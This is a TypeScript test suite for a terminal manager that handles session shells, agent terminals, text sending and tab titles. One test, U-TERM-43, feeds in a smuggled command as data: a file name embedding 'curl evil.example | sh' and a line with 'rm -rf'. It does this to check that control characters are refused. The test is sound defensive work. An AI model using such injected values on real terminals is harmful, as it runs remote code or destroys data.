  it('U-MEM-26 · closing a shell tab of a session removes its ring and checkpoint once its holder is released, running or already ended, as for a plain shell; an Agent, Server or Setup terminal closed the same way keeps its files, and so does a shell that was only stopped: its record stays and with it its last screen', async () => {
    const home = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'kea-u-mem-26-')))
    try {
      // (no state file here: one that is not a holder's own would make its PTY foreign; L-MEM-22 uses the real three)
      const EXTS = ['ring', 'ckpt']
      const ptys: [string, string, Partial<TerminalRecord>][] = [
        ['aaaaaaaaaa', 'S1', { kind: 'shell' }],
        ['bbbbbbbbbb', 'S1', { kind: 'agent' }],
        ['cccccccccc', 'S1', { kind: 'server' }],
        ['dddddddddd', 'S1', { kind: 'script' }],
        // a shell that has exited while its session was not shown: its holder lingers until its tab closes
        ['eeeeeeeeee', 'S1', { kind: 'shell', state: 'exited', exitCode: 0, endedAt: 2 }],
        ['ffffffffff', 'S1', { kind: 'shell' }],
        ['gggggggggg', 'S2', { kind: 'shell' }],
        ['hhhhhhhhhh', 'shells', { kind: 'shell' }],
      ]
      for (const [id, session] of ptys) {
        fs.mkdirSync(path.join(home, 'sessions', session), { recursive: true })
        for (const x of EXTS) fs.writeFileSync(path.join(home, 'sessions', session, `${id}.${x}`), 'x')
      }
      const left = (session: string) => fs.readdirSync(path.join(home, 'sessions', session)).sort()
      const of = (id: string) => EXTS.map((x) => `${id}.${x}`).sort()
      const records = new MemoryRecords(ptys.map(([id, session, over]) => record(id, session, over)))
      const ph = recordingPtyhost(ptys.map(([id, session, over]) => info(id, { sessionId: session, kind: over.kind ?? 'shell', state: over.state ?? 'running', exitCode: over.exitCode ?? null })))
      const t = new Terminals({ version: '0', log: noopLogger, env: async () => ({}), records, home })
      t.setControl(ph.coreSide)
      await call(t, 'terminal.restored', {})
      const all = left('S1')

      // the person closes a running shell tab: hung up, released, and then nothing of it is left
      expect(await call(t, 'terminal.close', { ptyId: 'aaaaaaaaaa' })).toEqual({ ok: true })
      expect(ph.touched('aaaaaaaaaa').map((c) => c.m)).toEqual(['pty.signal', 'pty.release'])
      expect([records.get('aaaaaaaaaa'), t.store.has('aaaaaaaaaa')]).toEqual([undefined, false])
      expect(left('S1'), 'the closed shell’s ring and checkpoint are gone; every other terminal’s stay').toEqual(all.filter((f) => !of('aaaaaaaaaa').includes(f)))
      // a tab closing because its shell had exited (the pane closes it): its lingering holder is released, same end
      expect(await call(t, 'terminal.close', { ptyId: 'eeeeeeeeee' })).toEqual({ ok: true })
      expect(ph.touched('eeeeeeeeee').map((c) => c.m)).toEqual(['pty.release'])
      expect(left('S1').filter((f) => f.startsWith('eeeeeeeeee.')), 'the ended shell’s files').toEqual([])
      // a shell that is stopped, not closed (archive, Stop): its record stays, ended, and its files with it
      expect(await t.stop('ffffffffff', 'hangup', 0)).toBe(true)
      expect(records.get('ffffffffff')?.state).toBe('exited')
      expect(left('S1').filter((f) => f.startsWith('ffffffffff.'))).toEqual(of('ffffffffff'))
      // only a shell: the Agent, Server and Setup terminals keep their files whatever closes them
      for (const id of ['bbbbbbbbbb', 'cccccccccc', 'dddddddddd']) {
        expect(await call(t, 'terminal.close', { ptyId: id })).toEqual({ ok: true })
        expect(left('S1').filter((f) => f.startsWith(`${id}.`)), `${id} keeps its files`).toEqual(of(id))
      }
      expect(left('S1')).toEqual([...of('bbbbbbbbbb'), ...of('cccccccccc'), ...of('dddddddddd'), ...of('ffffffffff')].sort())
      // another session's shell was never touched; a plain shell's files go with its tab, as before
      expect(left('S2')).toEqual(of('gggggggggg'))
      expect(await call(t, 'terminal.close', { ptyId: 'hhhhhhhhhh' })).toEqual({ ok: true })
      expect(left('shells')).toEqual([])
      t.dispose()
      ph.peer.dispose()
    } finally {
      fs.rmSync(runDir(home), { recursive: true, force: true })
      fs.rmSync(home, { recursive: true, force: true })
    }
  })
})

describe('core terminals: ⌘K', () => {
  it('U-PTY-45 · terminal.clear maps to pty.clear for a terminal core holds; an unknown PTY answers ok:false and reaches nothing', async () => {
    const ph = recordingPtyhost([info('aaaaaaaaaa')])
    const t = new Terminals({ version: '0', log: noopLogger, env: async () => ({}), records: new MemoryRecords([record('aaaaaaaaaa', 'shells')]) })
    t.setControl(ph.coreSide)
    await call(t, 'terminal.restored', {})
    expect(await call(t, 'terminal.clear', { ptyId: 'aaaaaaaaaa' })).toEqual({ ok: true })
    expect(ph.touched('aaaaaaaaaa')).toEqual([{ m: 'pty.clear', a: { ptyId: 'aaaaaaaaaa' } }])
    expect(await call(t, 'terminal.clear', { ptyId: 'zzzzzzzzzz' })).toEqual({ ok: false })
    expect(ph.calls.filter((c) => c.m === 'pty.clear')).toHaveLength(1)
    t.dispose()
    ph.peer.dispose()
  })
})

describe('core terminals: text from the window', () => {
  it('U-TERM-37 · terminal.sendText types into the session’s agent terminal, or the one named among its own running terminals; never Enter; nothing is written for another session’s terminal, an ended one, or a session with no agent', async () => {
    const ph = recordingPtyhost([info('aaaaaaaaaa', { sessionId: 's1', kind: 'agent' }), info('bbbbbbbbbb', { sessionId: 's1' }), info('cccccccccc', { sessionId: 's2' }), info('dddddddddd', { sessionId: 's1', state: 'exited' })])
    const records = new MemoryRecords([record('aaaaaaaaaa', 's1', { kind: 'agent' }), record('bbbbbbbbbb', 's1'), record('cccccccccc', 's2'), record('dddddddddd', 's1', { state: 'exited' })])
    const t = new Terminals({ version: '0', log: noopLogger, env: async () => ({}), records })
    t.setControl(ph.coreSide)
    await call(t, 'terminal.restored', {})
    const typed = () => ph.calls.filter((c) => c.m === 'pty.input').map((c) => c.a)
    // no target: the agent's prompt, as typed
    expect(await call(t, 'terminal.sendText', { sessionId: 's1', text: 'src/a.ts:3-9 ' })).toEqual({ ok: true })
    // a named terminal of the session; as a paste, markers in the text cannot end it
    expect(await call(t, 'terminal.sendText', { sessionId: 's1', ptyId: 'bbbbbbbbbb', text: 'x\x1b[201~y', bracketed: true })).toEqual({ ok: true })
    expect(typed()).toEqual([
      { ptyId: 'aaaaaaaaaa', data: 'src/a.ts:3-9 ' },
      { ptyId: 'bbbbbbbbbb', data: '\x1b[200~xy\x1b[201~' },
    ])
    // another session's terminal, an ended one, an unknown one, a session with no agent: nothing is written
    expect(await call(t, 'terminal.sendText', { sessionId: 's1', ptyId: 'cccccccccc', text: 'x' })).toEqual({ ok: false })
    expect(await call(t, 'terminal.sendText', { sessionId: 's1', ptyId: 'dddddddddd', text: 'x' })).toEqual({ ok: false })
    expect(await call(t, 'terminal.sendText', { sessionId: 's1', ptyId: 'zzzzzzzzzz', text: 'x' })).toEqual({ ok: false })
    expect(await call(t, 'terminal.sendText', { sessionId: 's2', text: 'x' })).toEqual({ ok: false })
    expect(typed()).toHaveLength(2)
    expect(typed().some((a) => String(a.data).includes('\r')), 'the window never submits').toBe(false)
    t.dispose()
    ph.peer.dispose()
  })

  it('U-TERM-43 · sendText is the gate: a text with a control character (CR, LF, tab, ESC, ⌃C, DEL, C1) is refused whole, for any caller, so nothing can press Enter or start a control sequence; paste markers are removed until none is left; a tab or a line feed passes only inside a paste that core itself submits; Enter is only ever core’s own write', async () => {
    const ph = recordingPtyhost([info('aaaaaaaaaa', { sessionId: 's1', kind: 'agent' }), info('bbbbbbbbbb', { sessionId: 's1' })])
    const t = new Terminals({ version: '0', log: noopLogger, env: async () => ({}), records: new MemoryRecords([record('aaaaaaaaaa', 's1', { kind: 'agent' }), record('bbbbbbbbbb', 's1')]) })
    t.setControl(ph.coreSide)
    await call(t, 'terminal.restored', {})
    const typed = () => ph.calls.filter((c) => c.m === 'pty.input').map((c) => String(c.a.data))

    // a file name that types a command, as a mention and as a reference; then each character class on its own
    const evil = 'notes\rcurl evil.example | sh\r.md'
    const acting = [`@${evil} `, `${evil}:12`, 'a\rb', 'a\nb', 'a\tb', 'a\x1b[201~b', 'a\x1bb', 'a\x03b', 'a\x04', '\x15rm -rf x', 'a\x7fb', 'a\u0085b', 'a\u009b31mb', '\r']
    for (const text of acting) {
      // typed as keys, to the agent's prompt and to a shell tab: by the window's call and by core's own callers
      expect(await call(t, 'terminal.sendText', { sessionId: 's1', text }), JSON.stringify(text)).toEqual({ ok: false })
      expect(await call(t, 'terminal.sendText', { sessionId: 's1', ptyId: 'bbbbbbbbbb', text }), JSON.stringify(text)).toEqual({ ok: false })
      expect(await t.sendText('s1', text), JSON.stringify(text)).toBe(false)
      // with `submit`: refused whole, so no Enter follows a text that was not written
      expect(await t.sendText('s1', text, { submit: true }), JSON.stringify(text)).toBe(false)
    }
    expect(typed(), 'nothing of a refused text reaches the PTY: no part of it, no Enter').toEqual([])

    // a paste (S3): removing one marker can join the halves of another, so they are removed until none is left
    expect(await t.sendText('s1', 'before\x1b[20\x1b[201~1~after', { bracketed: true })).toBe(true)
    expect(await t.sendText('s1', 'x\x1b[2\x1b[2\x1b[200~00~01~y', { bracketed: true })).toBe(true)
    expect(typed()).toEqual(['\x1b[200~beforeafter\x1b[201~', '\x1b[200~xy\x1b[201~'])
    // a paste that is not submitted: core cannot see whether the program reads pastes, so a line feed could be Enter
    // and a tab a completion; every other control character is refused in any paste
    ph.calls.length = 0
    for (const text of ['one\ntwo', 'a\tb', 'a\rb', 'a\x1bb', 'a\x03b', 'a\x1b[201~\rb']) expect(await t.sendText('s1', text, { bracketed: true }), JSON.stringify(text)).toBe(false)
    for (const text of ['a\rb', 'a\x1bb', 'a\x03b', 'a\x7fb', 'a\u009bb']) expect(await t.sendText('s1', text, { bracketed: true, submit: true }), JSON.stringify(text)).toBe(false)
    expect(typed()).toEqual([])
    // a paste core submits (a follow-up prompt of several lines): tab and line feed are text of the paste, and Enter
    // is one write of core's own, after it
    expect(await t.sendText('s1', 'one\n\ttwo', { bracketed: true, submit: true })).toBe(true)
    expect(await t.sendText('s1', 'continue', { submit: true })).toBe(true)
    expect(typed()).toEqual(['\x1b[200~one\n\ttwo\x1b[201~', '\r', 'continue', '\r'])
    // ordinary text is typed as it is: spaces, quotes, `$`, other scripts
    ph.calls.length = 0
    for (const text of ['src/a.ts:3-9 ', "$'notes\\rcurl evil.example | sh\\r.md' ", '@docs/日本語 notes.md ', 'my\\ file\\ \\(1\\).txt ']) expect(await call(t, 'terminal.sendText', { sessionId: 's1', text })).toEqual({ ok: true })
    expect(typed()).toEqual(['src/a.ts:3-9 ', "$'notes\\rcurl evil.example | sh\\r.md' ", '@docs/日本語 notes.md ', 'my\\ file\\ \\(1\\).txt '])
    t.dispose()
    ph.peer.dispose()
  })
})

describe('core terminals: calls waiting for ptyhost', () => {
  it('U-MEM-23 · while ptyhost is away at most L.coreControlWaitersMax calls wait for its control port; one more fails at once with `unavailable`; the next port releases them all; shutdown ends any still waiting', async () => {
    const t = new Terminals({ version: '0', log: noopLogger, env: async () => ({}) })
    const visible = (i: number) => call<{ ok: boolean }>(t, 'terminal.setVisible', { ptyIds: [`p${String(i).padStart(9, '0')}`] })
    const waiting = Array.from({ length: L.coreControlWaitersMax }, (_, i) => visible(i))
    await new Promise((r) => setTimeout(r, 0))
    expect(t.resourceCounts.waiters).toBe(L.coreControlWaitersMax)
    await expect(visible(L.coreControlWaitersMax), 'one past the cap fails at once').rejects.toMatchObject({ code: 'unavailable' })
    expect(t.resourceCounts.waiters).toBe(L.coreControlWaitersMax)

    const ph = recordingPtyhost([])
    t.setControl(ph.coreSide)
    expect(t.resourceCounts.waiters).toBe(0)
    expect(await Promise.all(waiting)).toEqual(waiting.map(() => ({ ok: true })))

    // ptyhost goes again; a call waits; core shuts down
    ph.peer.dispose()
    await new Promise((r) => setTimeout(r, 0))
    expect(t.resourceCounts.control).toBe(0)
    const late = visible(0)
    await new Promise((r) => setTimeout(r, 0))
    expect(t.resourceCounts.waiters).toBe(1)
    t.dispose()
    await expect(late).rejects.toMatchObject({ code: 'unavailable' })
    expect(t.resourceCounts.waiters).toBe(0)
  })
})

/** A clock the test moves by hand: `advance` runs the timers that fall due. */
function manualClock() {
  let now = 0
  let seq = 0
  let kept = 0
  const timers = new Map<number, { at: number; fn: () => void }>() // bounded: the timers of the service under test
  const unused = () => {
    throw new Error('not used here')
  }
  const clock: Clock = {
    now: () => now,
    // a handle as Node's: `unref` says the timer must not keep the process alive
    setTimeout: (fn, ms) => {
      const id = ++seq
      timers.set(id, { at: now + ms, fn })
      kept++
      return { id, unref: () => void kept-- }
    },
    clearTimeout: (h) => void timers.delete((h as { id: number }).id),
    setInterval: unused,
    clearInterval: unused,
  }
  return {
    clock,
    advance(ms: number): void {
      now += ms
      for (const [id, t] of [...timers]) {
        if (t.at > now || !timers.has(id)) continue
        timers.delete(id)
        t.fn()
      }
    },
    get armed(): number {
      return timers.size
    },
    /** Timers set and never marked `unref`: each would have kept the process alive. */
    get keptAlive(): number {
      return kept
    },
  }
}

/** Everything queued on the in-process channel (a note, the call it leads to, the answer) has been handled. */
const flushed = () => new Promise((r) => setTimeout(r, 0))

describe('core terminals: shell tabs titled with their foreground process', () => {
  // session s1: its agent, a shell tab, its dev server; session s2: a shell tab; the shells pseudo-session: one tab
  const holders = () => [
    info('aaaaaaaaaa', { sessionId: 's1', kind: 'agent' }),
    info('bbbbbbbbbb', { sessionId: 's1' }),
    info('cccccccccc', { sessionId: 's1', kind: 'server' }),
    info('dddddddddd', { sessionId: 's2' }),
    info('eeeeeeeeee'),
  ]
  const records = () =>
    new MemoryRecords([record('aaaaaaaaaa', 's1', { kind: 'agent' }), record('bbbbbbbbbb', 's1'), record('cccccccccc', 's1', { kind: 'server' }), record('dddddddddd', 's2'), record('eeeeeeeeee', 'shells')])
  const SHELL = { pid: 11, name: 'zsh' }

  async function start() {
    const ph = recordingPtyhost(holders())
    for (const h of holders()) ph.foreground.set(h.ptyId, SHELL)
    const time = manualClock()
    const visible = new VisibleSet()
    const t = new Terminals({ version: '0', log: noopLogger, env: async () => ({}), records: records(), visible, clock: time.clock })
    t.setControl(ph.coreSide)
    await call(t, 'terminal.restored', {})
    await flushed()
    const asked = () => ph.calls.filter((c) => c.m === 'pty.stat').map((c) => c.a.ptyId as string)
    /** A note from ptyhost: output started (`pty.activity`), output paused (`active` false), or a key. */
    const note = (m: 'pty.activity' | 'pty.keystroke', ptyId: string, active = true) => ph.peer.notify(m, m === 'pty.activity' ? { ptyId, active, at: 0 } : { ptyId, at: 0 })
    /** Let the rate limit's interval pass, and whatever that sets off settle. */
    const interval = async (n = 1) => {
      for (let i = 0; i < n; i++) {
        time.advance(L.tabTitleStatMs)
        await flushed()
      }
    }
    return { ph, time, visible, t, asked, note, interval, window: {}, name: (ptyId: string) => t.store.get(ptyId)?.foreground ?? null }
  }

  it('U-TERM-49 · a window that goes takes only its own visible terminals with it: the shells pane another window still shows stays on screen (its tab keeps its title and is still asked), and ptyhost is told what is left; when the last window goes nothing is on screen', async () => {
    const { ph, t, asked, note, interval, name } = await start()
    const [one, two] = [{ window: 1 }, { window: 2 }]
    const setVisible = (peer: object, ptyIds: string[]) => (t.handlers() as unknown as Record<string, (a: object, ctx: object) => Promise<unknown>>)['terminal.setVisible']!({ ptyIds }, { peer, signal: new AbortController().signal })
    await setVisible(one, ['eeeeeeeeee']) // window 1 shows the shells pane
    await setVisible(two, ['aaaaaaaaaa']) // window 2 a session's agent
    await flushed()
    expect(name('eeeeeeeeee')).toBe('zsh')
    expect(ph.calls.filter((c) => c.m === 'pty.setVisible').at(-1)?.a.ptyIds).toEqual(['eeeeeeeeee', 'aaaaaaaaaa'])
    // window 2 goes: window 1's terminals are still on screen
    t.windowGone(two)
    await flushed()
    expect(name('eeeeeeeeee'), 'the shells pane is still on screen in window 1').toBe('zsh')
    expect(ph.calls.filter((c) => c.m === 'pty.setVisible').at(-1)?.a.ptyIds).toEqual(['eeeeeeeeee'])
    await interval(2)
    const before = asked().length
    ph.foreground.set('eeeeeeeeee', { pid: 99, name: 'cat' })
    note('pty.keystroke', 'eeeeeeeeee')
    await flushed()
    expect([asked().length, name('eeeeeeeeee')]).toEqual([before + 1, 'cat'])
    // the last window goes: nothing is on screen (ptyhost is told nothing: the next window says what it shows)
    const told = ph.calls.filter((c) => c.m === 'pty.setVisible').length
    t.windowGone(one)
    await flushed()
    expect(name('eeeeeeeeee')).toBeNull()
    expect(ph.calls.filter((c) => c.m === 'pty.setVisible')).toHaveLength(told)
    expect(t.resourceCounts).toMatchObject({ titles: 0, titleTimers: 0, titleAsks: 0 })
  })

  it('U-TERM-47 · closing asks core what runs in a shell tab: the shell alone is not busy, a program is, with its name; when that cannot be learned (ptyhost has no answer, or the holder could not tell which process has the terminal) the answer is busy and says it is not known, so the tab is never closed over a program without asking; a terminal that has ended is not busy', async () => {
    const { ph, t } = await start()
    const fg = (ptyId: string) => call<{ busy: boolean; name: string; known: boolean }>(t, 'terminal.foreground', { ptyId })
    expect(await fg('bbbbbbbbbb')).toEqual({ busy: false, name: '', known: true })
    ph.foreground.set('bbbbbbbbbb', { pid: 99, name: 'cat' })
    expect(await fg('bbbbbbbbbb')).toEqual({ busy: true, name: 'cat', known: true })
    // ptyhost has no answer for it
    ph.foreground.delete('bbbbbbbbbb')
    expect(await fg('bbbbbbbbbb')).toEqual({ busy: true, name: '', known: false })
    // the holder could not tell which process group has the terminal (0)
    ph.foreground.set('bbbbbbbbbb', { pid: 0, name: '' })
    expect(await fg('bbbbbbbbbb')).toEqual({ busy: true, name: '', known: false })
    // ended, or not a terminal core knows: nothing can be lost
    ph.end('dddddddddd')
    await flushed()
    expect(await fg('dddddddddd')).toEqual({ busy: false, name: '', known: true })
    expect(await fg('zzzzzzzzzz')).toEqual({ busy: false, name: '', known: true })
  })

  it('U-TERM-39 · a shell tab on screen is asked what runs in its foreground when something happens in it, at most once per L.tabTitleStatMs; the store entry carries the name, follows a command that starts and gives the shell’s name back when it ends; a program caught before its exec is named when its output pauses; other kinds of PTY are never asked', async () => {
    const { ph, time, visible, t, asked, note, interval, window, name } = await start()
    expect(asked(), 'nothing is on screen yet').toEqual([])
    visible.set(window, 's1')
    await flushed()
    // its shell tab is asked as the session comes on screen: only that one (not its agent, its server, another session's shell, the shells)
    expect(asked()).toEqual(['bbbbbbbbbb'])
    expect(name('bbbbbbbbbb')).toBe('zsh')
    // nothing is due after the answer, and an idle shell is not polled (the timer's whole rule is tested in U-TERM-42)
    expect([time.armed, t.resourceCounts.titleTimers]).toEqual([0, 0])
    await interval(4)
    expect(asked(), 'an idle shell is not polled').toHaveLength(1)

    // a command starts later: what happens in the tab is the sign
    ph.foreground.set('bbbbbbbbbb', { pid: 99, name: 'cat' })
    note('pty.keystroke', 'bbbbbbbbbb')
    await flushed()
    expect(asked()).toHaveLength(2)
    expect(name('bbbbbbbbbb')).toBe('cat')
    await interval(2)
    expect(asked(), 'the same answer or another: nothing is asked until something happens').toHaveLength(2)

    // the rate limit: whatever starts or is typed within one interval of the last ask leads to one ask, when the interval is over
    for (const m of ['pty.activity', 'pty.keystroke', 'pty.activity', 'pty.keystroke', 'pty.activity'] as const) note(m, 'bbbbbbbbbb')
    await flushed()
    time.advance(0)
    expect(asked(), 'asked at once: an interval had passed').toHaveLength(3)
    for (const m of ['pty.activity', 'pty.keystroke', 'pty.activity'] as const) note(m, 'bbbbbbbbbb')
    await flushed()
    expect(asked(), 'not again within the interval').toHaveLength(3)
    expect(t.resourceCounts).toMatchObject({ titles: 1, titleTimers: 1, titleAsks: 0 })
    time.advance(L.tabTitleStatMs - 1)
    await flushed()
    expect(asked()).toHaveLength(3)
    time.advance(1)
    await flushed()
    expect(asked(), 'once, when the interval is over').toHaveLength(4)
    await interval(2)
    expect(asked()).toHaveLength(4)

    // caught between a shell's fork and its exec (a new foreground pid still named for the shell): the pause of the
    // output that started it is asked too, and by then the program has its name
    ph.foreground.set('bbbbbbbbbb', { pid: 120, name: 'zsh' })
    note('pty.activity', 'bbbbbbbbbb')
    await flushed()
    expect([asked().length, name('bbbbbbbbbb')]).toEqual([5, 'zsh'])
    ph.foreground.set('bbbbbbbbbb', { pid: 120, name: 'vim' })
    note('pty.activity', 'bbbbbbbbbb', false)
    await flushed()
    expect([asked().length, name('bbbbbbbbbb')]).toEqual([6, 'vim'])
    await interval(3)
    expect(asked(), 'quiet: no more').toHaveLength(6)

    // the program ends: the shell's own name is back
    ph.foreground.set('bbbbbbbbbb', SHELL)
    note('pty.activity', 'bbbbbbbbbb')
    await flushed()
    expect(name('bbbbbbbbbb')).toBe('zsh')
    await interval(2)

    // what is not a shell tab on screen is never asked, whatever happens in it
    const before = asked().length
    for (const id of ['aaaaaaaaaa', 'cccccccccc', 'dddddddddd', 'eeeeeeeeee']) {
      note('pty.activity', id)
      note('pty.keystroke', id)
    }
    await flushed()
    await interval(2)
    expect(asked()).toHaveLength(before)
    expect(['aaaaaaaaaa', 'cccccccccc', 'dddddddddd', 'eeeeeeeeee'].map(name)).toEqual([null, null, null, null])

    // ptyhost cannot tell (a holder being re-adopted answers nothing): the name known stays
    ph.foreground.delete('bbbbbbbbbb')
    note('pty.activity', 'bbbbbbbbbb')
    await flushed()
    expect(name('bbbbbbbbbb')).toBe('zsh')
    await interval(2)

    // the tab's shell exits: nothing is kept of it
    ph.end('bbbbbbbbbb')
    await flushed()
    expect(name('bbbbbbbbbb')).toBeNull()
    expect(t.resourceCounts).toMatchObject({ titles: 0, titleTimers: 0, titleAsks: 0 })
    expect(time.armed).toBe(0)
    t.dispose()
    ph.peer.dispose()
  })

  it('U-TERM-42 · a quiet shell tab holds no timer: coming on screen asks once and arms nothing; output that starts after a quiet spell is asked at once, and its pause is asked at once whatever the interval; only a start or a key inside L.tabTitleStatMs of the last ask arms a timer, one, which never keeps core alive and which the pause that follows takes back', async () => {
    const { ph, time, visible, t, asked, note, interval, window, name } = await start()
    const timers = () => [time.armed, t.resourceCounts.titleTimers]
    // on screen: asked once, and nothing is due later (a window that reloads leaves no timer behind, L-MEM-5)
    visible.set(window, 's1')
    await flushed()
    expect(asked()).toEqual(['bbbbbbbbbb'])
    expect(name('bbbbbbbbbb')).toBe('zsh')
    expect(timers(), 'quiet: no timer').toEqual([0, 0])
    await interval(3)
    expect(asked(), 'and never asked again while nothing happens').toHaveLength(1)

    // a command prints and stops, long after the last ask: both notes are asked at once, no timer either time
    ph.foreground.set('bbbbbbbbbb', { pid: 50, name: 'ls' })
    note('pty.activity', 'bbbbbbbbbb')
    await flushed()
    expect([asked().length, name('bbbbbbbbbb'), ...timers()]).toEqual([2, 'ls', 0, 0])
    ph.foreground.set('bbbbbbbbbb', SHELL)
    time.advance(1)
    note('pty.activity', 'bbbbbbbbbb', false)
    await flushed()
    expect([asked().length, name('bbbbbbbbbb'), ...timers()], 'the pause is asked at once, inside the interval too: it is the settled state').toEqual([3, 'zsh', 0, 0])
    await interval(3)
    expect(asked()).toHaveLength(3)

    // Return on a recalled command: the key is asked at once (the shell has not started the program yet), the echo that
    // follows inside the interval arms the one timer, more of the same arm no second one
    note('pty.keystroke', 'bbbbbbbbbb')
    await flushed()
    expect([asked().length, ...timers()]).toEqual([4, 0, 0])
    ph.foreground.set('bbbbbbbbbb', { pid: 60, name: 'yes' })
    for (const m of ['pty.activity', 'pty.keystroke', 'pty.keystroke'] as const) note(m, 'bbbbbbbbbb')
    await flushed()
    expect([asked().length, name('bbbbbbbbbb'), ...timers()]).toEqual([4, 'zsh', 1, 1])
    expect(time.keptAlive, 'the timer never keeps core alive').toBe(0)
    // … which is asked when the interval is over (output that never pauses sends no further note)
    await interval()
    expect([asked().length, name('bbbbbbbbbb'), ...timers()]).toEqual([5, 'yes', 0, 0])

    // a timer that is due when the output pauses is taken back: the pause is asked at once
    time.advance(L.tabTitleStatMs)
    note('pty.keystroke', 'bbbbbbbbbb')
    await flushed()
    note('pty.keystroke', 'bbbbbbbbbb')
    await flushed()
    expect([asked().length, ...timers()]).toEqual([6, 1, 1])
    ph.foreground.set('bbbbbbbbbb', SHELL)
    note('pty.activity', 'bbbbbbbbbb', false)
    await flushed()
    expect([asked().length, name('bbbbbbbbbb'), ...timers()]).toEqual([7, 'zsh', 0, 0])
    await interval(3)
    expect(asked(), 'quiet again: nothing more').toHaveLength(7)
    expect(time.keptAlive).toBe(0)
    t.dispose()
    ph.peer.dispose()
  })

  it('U-TERM-40 · a hidden session’s shell tabs are asked nothing and nothing is kept of them: asked once as the session comes on screen, dropped with its timer as it leaves; the shells pane counts while the window shows one of its terminals; 100 show/hide cycles leave no entry and no timer', async () => {
    const { ph, time, visible, t, asked, note, interval, window, name } = await start()
    // nothing on screen: whatever happens, nothing is asked
    for (const id of ['bbbbbbbbbb', 'dddddddddd', 'eeeeeeeeee']) note('pty.activity', id)
    await flushed()
    await interval(2)
    expect(asked()).toEqual([])
    expect(t.resourceCounts).toMatchObject({ titles: 0, titleTimers: 0, titleAsks: 0 })

    // s2 comes on screen: its tab is asked without anything happening in it
    ph.foreground.set('dddddddddd', { pid: 77, name: 'htop' })
    visible.set(window, 's2')
    await flushed()
    expect(asked()).toEqual(['dddddddddd'])
    expect(name('dddddddddd')).toBe('htop')
    // something happens in it within the interval: its one timer is due
    note('pty.keystroke', 'dddddddddd')
    await flushed()
    expect([time.armed, t.resourceCounts.titleTimers], 'an ask is due').toEqual([1, 1])

    // the window turns to s1: s2's tab is dropped with its timer, its entry carries no name, and s1's tab is asked
    visible.set(window, 's1')
    await flushed()
    expect(name('dddddddddd')).toBeNull()
    expect(asked()).toEqual(['dddddddddd', 'bbbbbbbbbb'])
    expect([time.armed, t.resourceCounts], 'nothing is due for a tab that came on screen').toMatchObject([0, { titles: 1, titleTimers: 0 }])
    await interval(2)
    note('pty.activity', 'dddddddddd')
    await flushed()
    await interval(2)
    expect(asked().filter((id) => id === 'dddddddddd'), 'hidden again: asked nothing').toHaveLength(1)

    // the shells pane: on screen while the window shows one of its terminals, and no longer once the window is gone
    visible.set(window, null)
    await call(t, 'terminal.setVisible', { ptyIds: ['eeeeeeeeee'] })
    await flushed()
    expect(name('eeeeeeeeee')).toBe('zsh')
    expect(name('bbbbbbbbbb')).toBeNull()
    await interval(2)
    t.windowGone()
    expect(name('eeeeeeeeee')).toBeNull()
    const quiet = asked().length
    note('pty.keystroke', 'eeeeeeeeee')
    await flushed()
    await interval(2)
    expect(asked()).toHaveLength(quiet)
    // with no window nothing is on screen: no tab followed, no timer armed, whatever happens (the idle of P-CPU-2)
    expect([time.armed, t.resourceCounts]).toMatchObject([0, { titles: 0, titleTimers: 0, titleAsks: 0 }])

    // cycles: a session shown and hidden again and again leaves nothing
    for (let i = 0; i < 100; i++) {
      visible.set(window, i % 2 ? 's1' : 's2')
      note('pty.activity', i % 2 ? 'bbbbbbbbbb' : 'dddddddddd')
      await flushed()
      expect(t.resourceCounts.titles).toBe(1)
      time.advance(i % 3 ? L.tabTitleStatMs : 1)
    }
    visible.drop(window)
    await flushed()
    expect(t.resourceCounts).toMatchObject({ titles: 0, titleTimers: 0, titleAsks: 0 })
    expect(time.armed).toBe(0)
    expect([name('bbbbbbbbbb'), name('dddddddddd')]).toEqual([null, null])
    t.dispose()
    ph.peer.dispose()
  })
})
